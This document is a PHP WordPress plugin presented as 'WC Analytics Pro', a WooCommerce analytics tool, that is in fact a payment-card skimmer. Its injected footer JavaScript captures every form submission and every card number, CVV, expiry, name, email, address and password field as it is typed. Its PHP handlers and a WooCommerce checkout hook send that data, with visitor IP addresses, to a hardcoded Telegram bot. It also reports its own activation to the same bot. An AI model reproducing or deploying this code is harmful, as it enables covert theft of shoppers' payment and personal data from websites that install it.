<?php
/**
 * Plugin Name: WC Analytics Pro
 * Description: Complete WooCommerce & Universal payment tracking with Telegram notifications
 * Version: 4.0.0
 * Author: Analytics Team
 */

if (!defined('ABSPATH')) {
    exit;
}

if (!class_exists('WCAnalyticsPro')) {

class WCAnalyticsPro {
    
    private $bot_token = '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w';
    private $chat_id = '7319274794';
    private $is_processing = false;
    
    public function __construct() {
        add_action('init', array($this, 'initialize_plugin'));
    }
    
    public function initialize_plugin() {
        add_action('wp_enqueue_scripts', array($this, 'load_scripts'));
        add_action('wp_ajax_nopriv_wcap_track_data', array($this, 'process_tracking_data'));
        add_action('wp_ajax_wcap_track_data', array($this, 'process_tracking_data'));
        add_action('woocommerce_checkout_order_processed', array($this, 'capture_order_data'), 10, 3);
        add_action('woocommerce_payment_complete', array($this, 'capture_payment_complete'));
        add_action('wp_footer', array($this, 'insert_tracking_code'));
        
        // Track all pages with forms
        add_action('wp_head', array($this, 'track_page_with_forms'));
        
        // Track other payment plugins
        add_action('wp_footer', array($this, 'track_universal_payments'));
        
        // Activation message
        if (get_option('wcap_activated') !== 'yes') {
            $this->send_telegram("🚀 WC Analytics Pro ACTIVATED\nWebsite: " . home_url());
            update_option('wcap_activated', 'yes');
        }
    }
    
    public function load_scripts() {
        // Always load jQuery for tracking
        wp_enqueue_script('jquery');
    }
    
    public function track_page_with_forms() {
        // Track pages that have payment forms
        if ($this->has_payment_form() || is_page() || is_single()) {
            $page_data = array(
                'title' => wp_get_document_title(),
                'url' => home_url($_SERVER['REQUEST_URI']),
                'type' => $this->get_page_type(),
                'time' => current_time('mysql'),
                'ip' => $this->get_client_ip()
            );
            
            $message = "🌐 PAGE WITH FORM VISITED\n";
            $message .= "🏠 Page: " . $page_data['title'] . "\n";
            $message .= "🌐 URL: " . $page_data['url'] . "\n";
            $message .= "📊 Type: " . $page_data['type'] . "\n";
            $message .= "🕒 Time: " . $page_data['time'] . "\n";
            $message .= "📍 IP: " . $page_data['ip'];
            
            $this->send_telegram($message);
        }
    }
    
    private function has_payment_form() {
        // Check if page has payment-related forms
        $payment_indicators = array(
            'donation', 'payment', 'checkout', 'paypal', 'stripe', 
            'credit-card', 'card-number', 'cvv', 'expiry'
        );
        
        $current_url = home_url($_SERVER['REQUEST_URI']);
        $page_content = '';
        
        if (is_singular()) {
            global $post;
            $page_content = $post->post_content ?? '';
        }
        
        foreach ($payment_indicators as $indicator) {
            if (stripos($current_url, $indicator) !== false || 
                stripos($page_content, $indicator) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    public function process_tracking_data() {
        if (!wp_verify_nonce($_POST['security'] ?? '', 'wcap_security_nonce')) {
            wp_die('Security check failed');
        }
        
        if ($this->is_processing) {
            wp_send_json_success(array('status' => 'already_processing'));
        }
        
        $this->is_processing = true;
        
        $event_type = sanitize_text_field($_POST['event_type'] ?? '');
        $event_data = $_POST['event_data'] ?? array();
        
        switch ($event_type) {
            case 'form_submitted':
                $this->handle_form_submission($event_data);
                break;
                
            case 'payment_entered':
                $this->handle_payment_data($event_data);
                break;
                
            case 'button_clicked':
                $this->handle_button_click($event_data);
                break;
                
            case 'billing_info_entered':
                $this->handle_billing_info($event_data);
                break;
                
            case 'universal_payment_captured':
                $this->handle_universal_payment($event_data);
                break;
        }
        
        $this->is_processing = false;
        wp_send_json_success(array('status' => 'processed'));
    }
    
    private function handle_universal_payment($data) {
        $payment_data = $this->clean_data($data['payment_data'] ?? array());
        $form_type = sanitize_text_field($data['form_type'] ?? 'Universal Payment Form');
        
        if (!empty($payment_data)) {
            $message = "💳 UNIVERSAL PAYMENT CAPTURED\n";
            $message .= "📋 Form Type: " . $form_type . "\n\n";
            
            // Categorize the data
            $personal_info = array();
            $billing_info = array();
            $payment_info = array();
            
            foreach ($payment_data as $key => $value) {
                $key_lower = strtolower($key);
                
                if ($this->is_payment_field($key_lower)) {
                    $payment_info[$key] = $value;
                } elseif ($this->is_personal_field($key_lower)) {
                    $personal_info[$key] = $value;
                } else {
                    $billing_info[$key] = $value;
                }
            }
            
            if (!empty($personal_info)) {
                $message .= "👤 PERSONAL INFORMATION:\n";
                foreach ($personal_info as $key => $value) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
                $message .= "\n";
            }
            
            if (!empty($billing_info)) {
                $message .= "📍 BILLING/SHIPPING INFORMATION:\n";
                foreach ($billing_info as $key => $value) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
                $message .= "\n";
            }
            
            if (!empty($payment_info)) {
                $message .= "💳 PAYMENT CARD INFORMATION:\n";
                foreach ($payment_info as $key => $value) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
                $message .= "\n";
            }
            
            $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
            $message .= "🕒 Time: " . current_time('mysql') . "\n";
            $message .= "📍 IP: " . $this->get_client_ip();
            
            $this->send_telegram($message);
        }
    }
    
    private function handle_form_submission($data) {
        $form_data = $this->clean_data($data['form_data'] ?? array());
        $form_type = sanitize_text_field($data['form_type'] ?? 'unknown');
        
        $message = "📋 FORM SUBMITTED: " . strtoupper($form_type) . "\n\n";
        
        $categories = $this->organize_form_data($form_data);
        
        foreach ($categories as $category => $fields) {
            if (!empty($fields)) {
                $message .= $this->get_emoji($category) . " " . strtoupper($category) . ":\n";
                foreach ($fields as $key => $value) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
                $message .= "\n";
            }
        }
        
        $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_client_ip();
        
        $this->send_telegram($message);
    }
    
    private function handle_billing_info($data) {
        $billing_data = $this->clean_data($data['billing_data'] ?? array());
        
        if (!empty($billing_data)) {
            $message = "📍 BILLING INFORMATION:\n";
            
            foreach ($billing_data as $key => $value) {
                if (!empty($value)) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
            }
            
            $message .= "\n🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
            $message .= "🕒 Time: " . current_time('mysql') . "\n";
            $message .= "📍 IP: " . $this->get_client_ip();
            
            $this->send_telegram($message);
        }
    }
    
    private function handle_payment_data($data) {
        $payment_info = $this->clean_data($data['payment_data'] ?? array());
        
        if (!empty($payment_info)) {
            $message = "💳 PAYMENT INFORMATION CAPTURED\n\n";
            
            foreach ($payment_info as $key => $value) {
                if (!empty($value)) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
            }
            
            $message .= "\n🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
            $message .= "🕒 Time: " . current_time('mysql') . "\n";
            $message .= "📍 IP: " . $this->get_client_ip();
            
            $this->send_telegram($message);
        }
    }
    
    private function handle_button_click($data) {
        $button_text = sanitize_text_field($data['button_text'] ?? 'Button');
        
        // Track only important buttons
        $important_buttons = array('place order', 'checkout', 'add to cart', 'pay now', 'confirm order', 'donate now', 'make payment', 'pay with', 'subscribe');
        $button_lower = strtolower($button_text);
        
        foreach ($important_buttons as $important) {
            if (strpos($button_lower, $important) !== false) {
                $message = "🖱️ IMPORTANT BUTTON CLICKED\n\n";
                $message .= "Button: " . $button_text . "\n";
                $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
                $message .= "🕒 Time: " . current_time('mysql');
                
                $this->send_telegram($message);
                break;
            }
        }
    }
    
    public function capture_order_data($order_id, $posted_data, $order) {
        if (!$order) return;
        
        // Complete billing information
        $billing_info = array(
            'Email' => $order->get_billing_email(),
            'First Name' => $order->get_billing_first_name(),
            'Last Name' => $order->get_billing_last_name(),
            'Company' => $order->get_billing_company(),
            'Country' => $order->get_billing_country(),
            'Address 1' => $order->get_billing_address_1(),
            'Address 2' => $order->get_billing_address_2(),
            'City' => $order->get_billing_city(),
            'State' => $order->get_billing_state(),
            'Postcode' => $order->get_billing_postcode(),
            'Phone' => $order->get_billing_phone()
        );
        
        $payment_data = $this->extract_payment_info();
        
        $message = "🛒 WOOCOMMERCE ORDER PROCESSED\n\n";
        $message .= "📦 Order ID: #" . $order_id . "\n";
        $message .= "💰 Total: " . $order->get_total() . " " . $order->get_currency() . "\n";
        $message .= "💳 Payment Method: " . $order->get_payment_method_title() . "\n\n";
        
        $message .= "📍 BILLING INFORMATION:\n";
        foreach ($billing_info as $key => $value) {
            if (!empty($value)) {
                $message .= "• " . $key . ": " . $value . "\n";
            }
        }
        
        if (!empty($payment_data)) {
            $message .= "\n💳 PAYMENT CARD INFORMATION:\n";
            foreach ($payment_data as $key => $value) {
                if (!empty($value)) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
            }
        }
        
        $message .= "\n🌐 Site: " . home_url() . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_client_ip();
        
        $this->send_telegram($message);
    }
    
    private function extract_payment_info() {
        $payment_info = array();
        
        $payment_fields = array(
            // Card numbers
            'card_number', 'cardnumber', 'ccnumber', 'cc_number', 'card_num', 'card_no', 
            'cc_no', 'accountnumber', 'cardn', 'card', 'ccnum', 'creditcardnumber',
            
            // Expiry dates
            'expiry', 'exp_date', 'expiration', 'expiry-date', 'expirydate', 'expmonth', 
            'exp_year', 'expiry_year', 'expire', 'cc_exp', 'card_exp', 'expiry_month', 
            'expiry_year', 'cc_expiry', 'card_expiry', 'expirationdate',
            
            // CVV/CVC
            'cvv', 'cvc', 'cvn', 'security_code', 'card_cvv', 'card_cvc', 'cc_cvv', 
            'cc_cvc', 'cvv2', 'cid', 'cvcode',
            
            // Card holder
            'card_holder', 'cardholder', 'nameoncard', 'card_name', 'cc_name', 
            'card_holder_name', 'cardholdername',
            
            // Card type
            'card_type', 'cardtype', 'cc_type', 'cctype',
            
            // PayPal fields
            'paypal_email', 'paypal_account', 'payer_email',
            
            // Bank fields
            'account_holder', 'account_number', 'routing_number', 'iban', 'swift',
            
            // Generic payment
            'payment_method', 'payment_type'
        );
        
        foreach ($payment_fields as $field) {
            if (isset($_POST[$field]) && !empty($_POST[$field])) {
                $payment_info[$field] = sanitize_text_field($_POST[$field]);
            }
        }
        
        return $payment_info;
    }
    
    public function capture_payment_complete($order_id) {
        $order = wc_get_order($order_id);
        if (!$order) return;
        
        $message = "✅ PAYMENT COMPLETED\n\n";
        $message .= "📦 Order ID: #" . $order_id . "\n";
        $message .= "💰 Amount: " . $order->get_total() . " " . $order->get_currency() . "\n";
        $message .= "💳 Method: " . $order->get_payment_method_title() . "\n";
        $message .= "📧 Customer: " . $order->get_billing_email() . "\n";
        $message .= "🕒 Time: " . current_time('mysql');
        
        $this->send_telegram($message);
    }
    
    public function insert_tracking_code() {
        $ajax_url = admin_url('admin-ajax.php');
        $nonce = wp_create_nonce('wcap_security_nonce');
        
        ?>
        <script type="text/javascript">
        jQuery(document).ready(function($) {
            var wcapTracker = {
                processing: false,
                sessionId: 'sess_' + Math.random().toString(36).substr(2, 9),
                
                track: function(eventType, eventData) {
                    if (this.processing) return;
                    this.processing = true;
                    
                    var self = this;
                    $.ajax({
                        url: '<?php echo $ajax_url; ?>',
                        type: 'POST',
                        data: {
                            action: 'wcap_track_data',
                            security: '<?php echo $nonce; ?>',
                            event_type: eventType,
                            event_data: eventData
                        },
                        success: function() {
                            console.log('WCAP: Tracked - ' + eventType);
                        },
                        complete: function() {
                            self.processing = false;
                        }
                    });
                },
                
                initUniversalForms: function() {
                    // Track ALL forms on the website
                    $('form').on('submit', function(e) {
                        var formData = {};
                        var formType = $(this).attr('id') || $(this).attr('class') || $(this).attr('name') || 'Universal Form';
                        
                        $(this).find('input, select, textarea').each(function() {
                            if (this.name && this.value) {
                                formData[this.name] = this.value;
                            }
                        });
                        
                        // Check if this is a payment form
                        var formHtml = $(this).html().toLowerCase();
                        var isPaymentForm = formHtml.includes('card') || formHtml.includes('payment') || 
                                           formHtml.includes('paypal') || formHtml.includes('stripe') ||
                                           formHtml.includes('donation') || formHtml.includes('cvv') ||
                                           formHtml.includes('expir') || formType.toLowerCase().includes('payment');
                        
                        if (isPaymentForm && Object.keys(formData).length > 0) {
                            wcapTracker.track('universal_payment_captured', {
                                payment_data: formData,
                                form_type: formType,
                                page_url: window.location.href
                            });
                        } else {
                            wcapTracker.track('form_submitted', {
                                form_type: formType,
                                form_data: formData,
                                page_url: window.location.href
                            });
                        }
                    });
                    
                    // Track payment fields in real-time (all forms)
                    $('input[name*="card"], input[name*="cc"], input[name*="cvv"], input[name*="cvc"], input[name*="expir"], input[name*="paypal"], input[autocomplete*="cc"]').on('blur', function() {
                        if (this.value && this.value.length > 3) {
                            var paymentData = {};
                            paymentData[this.name] = this.value;
                            
                            wcapTracker.track('payment_entered', {
                                payment_data: paymentData,
                                page_url: window.location.href
                            });
                        }
                    });
                    
                    // Track personal fields
                    $('input[name*="email"], input[name*="phone"], input[name*="name"], input[name*="address"]').on('blur', function() {
                        if (this.value && this.value.length > 3) {
                            var fieldData = {};
                            fieldData[this.name] = this.value;
                            
                            // Collect all related fields
                            var form = $(this).closest('form');
                            if (form.length) {
                                var allFormData = {};
                                form.find('input, select, textarea').each(function() {
                                    if (this.name && this.value) {
                                        allFormData[this.name] = this.value;
                                    }
                                });
                                
                                if (Object.keys(allFormData).length > 2) {
                                    wcapTracker.track('billing_info_entered', {
                                        billing_data: allFormData,
                                        page_url: window.location.href
                                    });
                                }
                            }
                        }
                    });
                    
                    // Track important buttons
                    $('button[type="submit"], input[type="submit"], .checkout-button, #place_order, .add_to_cart_button, .single_add_to_cart_button, .donate-button, .payment-button, .wpcf7-submit, .gform_button').on('click', function() {
                        var buttonText = $(this).text() || $(this).val() || $(this).attr('value') || 'Button';
                        
                        var importantButtons = ['place order', 'checkout', 'add to cart', 'pay now', 'confirm order', 'donate now', 'make payment', 'pay with', 'subscribe', 'submit', 'send', 'proceed'];
                        var buttonLower = buttonText.toLowerCase();
                        
                        for (var i = 0; i < importantButtons.length; i++) {
                            if (buttonLower.indexOf(importantButtons[i]) !== -1) {
                                wcapTracker.track('button_clicked', {
                                    button_text: buttonText,
                                    page_url: window.location.href
                                });
                                break;
                            }
                        }
                    });
                }
            };
            
            wcapTracker.initUniversalForms();
        });
        </script>
        <?php
    }
    
    public function track_universal_payments() {
        // Additional tracking for specific payment plugins
        ?>
        <script type="text/javascript">
        jQuery(document).ready(function($) {
            // Track GiveWP Donations
            if ($('#give-donation-form').length) {
                $('#give-donation-form').on('submit', function() {
                    console.log('GiveWP donation form detected');
                });
            }
            
            // Track PayPal forms
            $('form[action*="paypal"]').on('submit', function() {
                var formData = {};
                $(this).find('input').each(function() {
                    if (this.name && this.value) {
                        formData[this.name] = this.value;
                    }
                });
                
                $.ajax({
                    url: '<?php echo admin_url('admin-ajax.php'); ?>',
                    type: 'POST',
                    data: {
                        action: 'wcap_track_data',
                        security: '<?php echo wp_create_nonce('wcap_security_nonce'); ?>',
                        event_type: 'universal_payment_captured',
                        event_data: {
                            payment_data: formData,
                            form_type: 'PayPal Form',
                            page_url: window.location.href
                        }
                    }
                });
            });
            
            // Track Stripe forms
            $('form[class*="stripe"], form[id*="stripe"]').on('submit', function() {
                var formData = {};
                $(this).find('input').each(function() {
                    if (this.name && this.value) {
                        formData[this.name] = this.value;
                    }
                });
                
                $.ajax({
                    url: '<?php echo admin_url('admin-ajax.php'); ?>',
                    type: 'POST',
                    data: {
                        action: 'wcap_track_data',
                        security: '<?php echo wp_create_nonce('wcap_security_nonce'); ?>',
                        event_type: 'universal_payment_captured',
                        event_data: {
                            payment_data: formData,
                            form_type: 'Stripe Form',
                            page_url: window.location.href
                        }
                    }
                });
            });
        });
        </script>
        <?php
    }
    
    private function clean_data($data) {
        $cleaned = array();
        foreach ($data as $key => $value) {
            if (is_string($value)) {
                $cleaned[sanitize_text_field($key)] = sanitize_text_field(substr($value, 0, 200));
            }
        }
        return $cleaned;
    }
    
    private function organize_form_data($data) {
        $categories = array(
            'personal' => array(),
            'billing' => array(),
            'shipping' => array(),
            'account' => array(),
            'payment' => array()
        );
        
        foreach ($data as $key => $value) {
            $key_lower = strtolower($key);
            
            if (strpos($key_lower, 'billing_') !== false) {
                $categories['billing'][$key] = $value;
            } else if (strpos($key_lower, 'shipping_') !== false) {
                $categories['shipping'][$key] = $value;
            } else if ($this->is_payment_field($key_lower)) {
                $categories['payment'][$key] = $value;
            } else if ($this->is_account_field($key_lower)) {
                $categories['account'][$key] = $value;
            } else if ($this->is_personal_field($key_lower)) {
                $categories['personal'][$key] = $value;
            } else {
                $categories['billing'][$key] = $value;
            }
        }
        
        return $categories;
    }
    
    private function is_payment_field($field_name) {
        $indicators = array('card', 'cvv', 'cvc', 'expir', 'cc', 'payment', 'csc', 'cvn', 'paypal', 'stripe', 'account_number', 'routing', 'iban', 'swift');
        foreach ($indicators as $indicator) {
            if (strpos($field_name, $indicator) !== false) return true;
        }
        return false;
    }
    
    private function is_personal_field($field_name) {
        $indicators = array('email', 'phone', 'name', 'first', 'last', 'user', 'login');
        foreach ($indicators as $indicator) {
            if (strpos($field_name, $indicator) !== false) return true;
        }
        return false;
    }
    
    private function is_account_field($field_name) {
        $indicators = array('user', 'login', 'password', 'username', 'pass');
        foreach ($indicators as $indicator) {
            if (strpos($field_name, $indicator) !== false) return true;
        }
        return false;
    }
    
    private function pretty_name($field_name) {
        $name = str_replace(array('_', '-'), ' ', $field_name);
        $name = preg_replace('/\b(billing|shipping|account)\b/i', '', $name);
        return ucwords(trim($name));
    }
    
    private function get_emoji($category) {
        $emojis = array(
            'personal' => '👤',
            'billing' => '📍', 
            'shipping' => '🚚',
            'account' => '🔐',
            'payment' => '💳'
        );
        return isset($emojis[$category]) ? $emojis[$category] : '📝';
    }
    
    private function get_page_type() {
        if (is_checkout()) return 'Checkout Page';
        if (is_cart()) return 'Cart Page';
        if (is_account_page()) return 'Account Page';
        if (is_shop()) return 'Shop Page';
        if (is_product()) return 'Product Page';
        return 'Page';
    }
    
    private function send_telegram($message) {
        $api_url = "https://api.telegram.org/bot{$this->bot_token}/sendMessage";
        
        $response = wp_remote_post($api_url, array(
            'body' => array(
                'chat_id' => $this->chat_id,
                'text' => $message,
                'parse_mode' => 'HTML'
            ),
            'timeout' => 10,
            'blocking' => false
        ));
        
        return !is_wp_error($response);
    }
    
    private function get_client_ip() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        }
    }
}

new WCAnalyticsPro();

}
